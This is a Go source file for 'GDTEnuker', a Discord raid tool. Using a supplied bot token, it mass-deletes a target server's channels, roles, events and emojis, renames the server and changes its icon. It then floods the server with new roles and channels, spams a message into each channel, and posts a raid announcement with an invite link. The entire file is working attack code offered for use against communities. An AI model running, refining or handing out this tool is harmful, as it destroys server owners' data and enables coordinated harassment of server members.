package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/bwmarrin/discordgo"
)

const (
	RESET      = "\033[0m"
	BOLD       = "\033[1m"
	CLEAR_SCREEN = "\033[2J\033[H"
	CLEAR_LINE   = "\033[2K\r"
	HIDE_CURSOR  = "\033[?25l"
	SHOW_CURSOR  = "\033[?25h"
)
var GRADIENT = []int{196, 202, 208, 214, 220, 226, 190, 154, 118, 82, 46, 47, 48, 49, 50, 51, 45, 39, 33, 27, 21, 57, 93, 129, 165, 201, 200, 199, 198, 197}

var gradPos int
var gradMu sync.Mutex

func nextColor() int {
	gradMu.Lock()
	defer gradMu.Unlock()
	c := GRADIENT[gradPos%len(GRADIENT)]
	gradPos++
	return c
}

func resetGradient() {
	gradMu.Lock()
	gradPos = 0
	gradMu.Unlock()
}

func gradientString(s string) string {
	var b strings.Builder
	for _, ch := range s {
		if ch == '\n' || ch == '\r' {
			b.WriteRune(ch)
			continue
		}
		b.WriteString(fmt.Sprintf("\033[38;5;%dm%c", nextColor(), ch))
	}
	b.WriteString(RESET)
	return b.String()
}

func gradientColor(s string) string {
	c := nextColor()
	return fmt.Sprintf("\033[38;5;%dm%s%s", c, s, RESET)
}

func logOK(action, detail string) {
	t := time.Now().Format("15:04:05.000")
	resetGradient()
	msg := fmt.Sprintf("[%s][+]%s -> %s", t, action, detail)
	fmt.Println(gradientString(msg))
}

func logFAIL(action, detail string) {
	t := time.Now().Format("15:04:05.000")
	resetGradient()
	msg := fmt.Sprintf("[%s][-]%s -> %s", t, action, detail)
	fmt.Println(gradientString(msg))
}

func logInfo(msg string) {
	resetGradient()
	fmt.Println(gradientString(msg))
}

func logQuestion(prompt string) string {
	resetGradient()
	fmt.Print(gradientString("[?] " + prompt))
	reader := bufio.NewReader(os.Stdin)
	input, _ := reader.ReadString('\n')
	return strings.TrimSpace(input)
}

func logIntQuestion(prompt string) int {
	for {
		resetGradient()
		fmt.Print(gradientString("[?] " + prompt))
		reader := bufio.NewReader(os.Stdin)
		input, _ := reader.ReadString('\n')
		input = strings.TrimSpace(input)
		val, err := strconv.Atoi(input)
		if err == nil && val >= 0 {
			return val
		}
		logInfo("[-] Invalid number. Please try again.")
	}
}

func logHexQuestion(prompt string) int {
	for {
		resetGradient()
		fmt.Print(gradientString("[?] " + prompt))
		reader := bufio.NewReader(os.Stdin)
		input, _ := reader.ReadString('\n')
		input = strings.TrimSpace(input)
		if strings.HasPrefix(input, "0x") || strings.HasPrefix(input, "0X") {
			input = input[2:]
		}
		val, err := strconv.ParseInt(input, 16, 64)
		if err == nil {
			return int(val)
		}
		logInfo("[-] Invalid hex color. Please try again.")
	}
}

func clearScreen() {
	fmt.Print(CLEAR_SCREEN)
	fmt.Print(HIDE_CURSOR)
}

func showCursor() {
	fmt.Print(SHOW_CURSOR)
}

var FACE_EMOJIS = []string{
	"\U0001F600", "\U0001F603", "\U0001F604", "\U0001F601", "\U0001F606", "\U0001F605", "\U0001F602", "\U0001F923", "\U0001F60A", "\U0001F607",
	"\U0001F642", "\U0001F643", "\U0001F609", "\U0001F60C", "\U0001F60D", "\U0001F970", "\U0001F618", "\U0001F617", "\U0001F619", "\U0001F61A",
	"\U0001F60B", "\U0001F61B", "\U0001F61D", "\U0001F61C", "\U0001F92A", "\U0001F928", "\U0001F9D0", "\U0001F913", "\U0001F60E", "\U0001F929",
	"\U0001F973", "\U0001F60F", "\U0001F612", "\U0001F61E", "\U0001F614", "\U0001F61F", "\U0001F615", "\U0001F641", "\U00002639\U0000FE0F", "\U0001F623",
	"\U0001F616", "\U0001F62B", "\U0001F629", "\U0001F97A", "\U0001F622", "\U0001F62D", "\U0001F624", "\U0001F620", "\U0001F621", "\U0001F92C",
}

func downloadToBase64(url string) string {
	if url == "" {
		return ""
	}
	resp, err := http.Get(url)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()
	contentType := resp.Header.Get("Content-Type")
	if contentType == "" {
		contentType = "image/png"
	}
	data, err := io.ReadAll(resp.Body)
	if err != nil {
		return ""
	}
	b64 := base64.StdEncoding.EncodeToString(data)
	return fmt.Sprintf("data:%s;base64,%s", contentType, b64)
}

func loadFile(path string) string {
	data, err := os.ReadFile(path)
	if err != nil {
		return ""
	}
	return strings.TrimSpace(string(data))
}

func loadChannelNames() []string {
	file, err := os.Open("ch.txt")
	if err != nil {
		logInfo("[-] ch.txt not found, using default names")
		return []string{"channel-"}
	}
	defer file.Close()
	var names []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			names = append(names, line)
		}
	}
	if len(names) == 0 {
		return []string{"channel-"}
	}
	return names
}

func generateChannelName(baseNames []string) string {
	base := baseNames[rand.Intn(len(baseNames))]
	var sb strings.Builder
	for j := 0; j < 10; j++ {
		sb.WriteString(FACE_EMOJIS[rand.Intn(len(FACE_EMOJIS))])
	}
	return base + sb.String()
}

func main() {
	clearScreen()
	defer showCursor()

	asciiLines := []string{
		"  ____ ____ _____ _____               _             ",
		" / ___|  _ \\_   _| ____|  _ __  _   _| | _____ _ __ ",
		"| |  _| | | || | |  _|   | '_ \\| | | | |/ / _ \\ '__|",
		"| |_| | |_| || | | |___  | | | | |_| |   <  __/ |   ",
		" \\____|____/ |_| |_____| |_| |_|\\__,_|_|\\_\\___|_|   ",
	}
	for _, line := range asciiLines {
		resetGradient()
		fmt.Println(gradientString(line))
	}
	fmt.Println()

	token := loadFile("bot.txt")
	if token == "" {
		logInfo("[-] bot.txt not found or empty!")
		logInfo("[i] Please create bot.txt with your bot token.")
		showCursor()
		return
	}
	logInfo("[+] Bot token loaded from bot.txt")

	messageContent := loadFile("me.txt")
	if messageContent == "" {
		logInfo("[-] me.txt not found or empty!")
		logInfo("[i] Please create me.txt with your message content.")
		showCursor()
		return
	}
	logInfo("[+] Message content loaded from me.txt")

	fmt.Println()
	logInfo(" ")
	fmt.Println()

	guildID := logQuestion("Enter target Guild ID: ")
	if guildID == "" {
		logInfo("[-] Guild ID is required!")
		showCursor()
		return
	}

	channelCount := logIntQuestion("Enter number of channels to create: ")
	channelNames := loadChannelNames()
	logInfo(fmt.Sprintf("[+] Loaded %d base channel names from ch.txt", len(channelNames)))

	roleName := logQuestion("Enter role name: ")
	roleCount := logIntQuestion("Enter number of roles to create: ")
	roleColor := logHexQuestion("Enter role color (hex, e.g., DC143C): ")

	serverName := logQuestion("Enter new server name: ")
	iconURL := logQuestion("Enter server icon URL (or leave empty): ")

	fmt.Println()
	logInfo("=== Summary ===")
	logInfo(fmt.Sprintf("[i] Guild ID: %s", guildID))
	logInfo(fmt.Sprintf("[i] Channels: %d", channelCount))
	logInfo(fmt.Sprintf("[i] Roles: %d x %s", roleCount, roleName))
	logInfo(fmt.Sprintf("[i] Role Color: #%06X", roleColor))
	logInfo(fmt.Sprintf("[i] Server Name: %s", serverName))
	fmt.Println()

	logQuestion("Press ENTER to start nuke...")

	dg, err := discordgo.New("Bot " + token)
	if err != nil {
		logInfo(fmt.Sprintf("[-] Error creating session: %v", err))
		showCursor()
		return
	}

	dg.Identify.Intents = discordgo.IntentsGuilds | discordgo.IntentsGuildMessages | discordgo.IntentsMessageContent

	dg.AddHandler(func(s *discordgo.Session, r *discordgo.Ready) {
		logInfo(fmt.Sprintf("[+] %s is connected!", r.User.Username))
		go nukeGuild(s, guildID, serverName, iconURL, roleName, roleCount, roleColor, channelCount, channelNames, messageContent)
	})

	err = dg.Open()
	if err != nil {
		logInfo(fmt.Sprintf("[-] Error opening connection: %v", err))
		showCursor()
		return
	}
	defer dg.Close()

	logInfo("[i] Bot is running. Press Ctrl+C to exit.")
	select {}
}

func nukeGuild(s *discordgo.Session, guildID, serverName, iconURL, roleName string, roleCount, roleColor, channelCount int, channelNames []string, messageContent string) {
	startTime := time.Now()
	fmt.Println()
	logInfo("=== NUKE STARTED ===")
	fmt.Println()

	logInfo("[i] Changing server name and icon...")
	go func() {
		iconBase64 := downloadToBase64(iconURL)
		g := &discordgo.GuildParams{Name: serverName}
		if iconBase64 != "" {
			g.Icon = iconBase64
		}
		_, err := s.GuildEdit(guildID, g)
		if err != nil {
			logFAIL("server edit", err.Error())
		} else {
			logOK("server edit", serverName)
		}
	}()

	logInfo("[i] Deleting existing channels...")
	channels, _ := s.GuildChannels(guildID)
	var chWg sync.WaitGroup
	for _, ch := range channels {
		chWg.Add(1)
		go func(cID, cName string) {
			defer chWg.Done()
			_, err := s.ChannelDelete(cID)
			if err != nil {
				logFAIL("channel delete", cName)
			} else {
				logOK("channel delete", cName)
			}
		}(ch.ID, ch.Name)
	}
	chWg.Wait()

	logInfo("[i] Deleting existing roles...")
	roles, _ := s.GuildRoles(guildID)
	var roleWg sync.WaitGroup
	for _, role := range roles {
		if role.ID == guildID || role.Managed {
			continue
		}
		roleWg.Add(1)
		go func(rID, rName string) {
			defer roleWg.Done()
			err := s.GuildRoleDelete(guildID, rID)
			if err != nil {
				logFAIL("role delete", rName)
			} else {
				logOK("role delete", rName)
			}
		}(role.ID, role.Name)
	}
	roleWg.Wait()

	logInfo("[i] Deleting existing events...")
	events, _ := s.GuildScheduledEvents(guildID, false)
	var evWg sync.WaitGroup
	for _, ev := range events {
		evWg.Add(1)
		go func(eID string) {
			defer evWg.Done()
			_ = s.GuildScheduledEventDelete(guildID, eID)
		}(ev.ID)
	}
	evWg.Wait()

	logInfo("[i] Deleting existing emojis...")
	emojis, _ := s.GuildEmojis(guildID)
	var emojiWg sync.WaitGroup
	for _, em := range emojis {
		emojiWg.Add(1)
		go func(eID string) {
			defer emojiWg.Done()
			_ = s.GuildEmojiDelete(guildID, eID)
		}(em.ID)
	}
	emojiWg.Wait()

	if roleCount > 0 {
		logInfo(fmt.Sprintf("[i] Creating %d roles...", roleCount))
		roleColorVal := roleColor
		var roleCreateWg sync.WaitGroup
		for i := 0; i < roleCount; i++ {
			roleCreateWg.Add(1)
			go func(idx int) {
				defer roleCreateWg.Done()
				_, err := s.GuildRoleCreate(guildID, &discordgo.RoleParams{
					Name:        roleName,
					Color:       &roleColorVal,
					Hoist:       boolPtr(true),
					Mentionable: boolPtr(true),
				})
				if err != nil {
					logFAIL("role make", err.Error())
				} else {
					logOK("role make", roleName)
				}
			}(i)
		}
		roleCreateWg.Wait()
	}

	if channelCount > 0 {
		logInfo(fmt.Sprintf("[i] Creating %d channels...", channelCount))
		preGeneratedNames := make([]string, channelCount)
		for i := 0; i < channelCount; i++ {
			preGeneratedNames[i] = generateChannelName(channelNames)
		}

		createdChannels := make([]*discordgo.Channel, 0, channelCount)
		var chMu sync.Mutex
		var chCreateWg sync.WaitGroup

		for i, name := range preGeneratedNames {
			chCreateWg.Add(1)
			go func(idx int, n string) {
				defer chCreateWg.Done()
				ch, err := s.GuildChannelCreateComplex(guildID, discordgo.GuildChannelCreateData{
					Name: n,
					Type: discordgo.ChannelTypeGuildText,
				})
				if err == nil {
					chMu.Lock()
					createdChannels = append(createdChannels, ch)
					chMu.Unlock()
					logOK("channel make", ch.Name)
				} else {
					logFAIL("channel make", n)
				}
			}(i, name)
		}
		chCreateWg.Wait()
		logInfo(fmt.Sprintf("[+] Created %d/%d channels!", len(createdChannels), channelCount))

		if len(createdChannels) > 0 {
			logInfo("[i] Sending messages to all channels...")
			var msgWg sync.WaitGroup
			msgSuccess := 0
			msgErr := 0
			var msgMu sync.Mutex

			for _, ch := range createdChannels {
				msgWg.Add(1)
				go func(cID string) {
					defer msgWg.Done()
					_, err := s.ChannelMessageSend(cID, messageContent)
					if err != nil {
						msgMu.Lock()
						msgErr++
						msgMu.Unlock()
						logFAIL("message false", cID)
					} else {
						msgMu.Lock()
						msgSuccess++
						msgMu.Unlock()
						logOK("message ok", cID)
					}
				}(ch.ID)
			}
			msgWg.Wait()
			logInfo(fmt.Sprintf("[+] Sent %d messages (errors: %d)!", msgSuccess, msgErr))
		}
	}

	logInfo("[i] Sending embed to rules channel...")
	channels, _ = s.GuildChannels(guildID)
	var rulesCh *discordgo.Channel
	for _, ch := range channels {
		if strings.Contains(strings.ToLower(ch.Name), "rules") || strings.Contains(strings.ToLower(ch.Name), "rule") {
			rulesCh = ch
			break
		}
	}

	if rulesCh != nil {
		embed := &discordgo.MessageEmbed{
			Title:       "\U0001F480 GDTEnuker",
			Description: "This server has been raided by **GDTE**!\n\nWe are unstoppable.\nJoin: https://discord.gg/TbkZR5fhUs ",
			Color:       0x242929,
			Thumbnail: &discordgo.MessageEmbedThumbnail{
				URL: "https://cdn.discordapp.com/attachments/1514638682664210705/1515732847493906482/Screenshot_2026-06-14_235923.png",
			},
			Footer: &discordgo.MessageEmbedFooter{
				Text: "@everyone https://github.com/agehantonu/GDTE-nuker",
			},
			Timestamp: time.Now().Format(time.RFC3339),
		}
		_, err := s.ChannelMessageSendEmbed(rulesCh.ID, embed)
		if err != nil {
			logFAIL("embed send", err.Error())
		} else {
			logOK("embed send", rulesCh.Name)
		}
	} else {
		logFAIL("embed send", "no rules channel found")
	}

	fmt.Println()
	logInfo(" ")
	logInfo(fmt.Sprintf("[+] Total execution time: %v", time.Since(startTime)))
	fmt.Println()
}

func boolPtr(b bool) *bool {
	return &b
}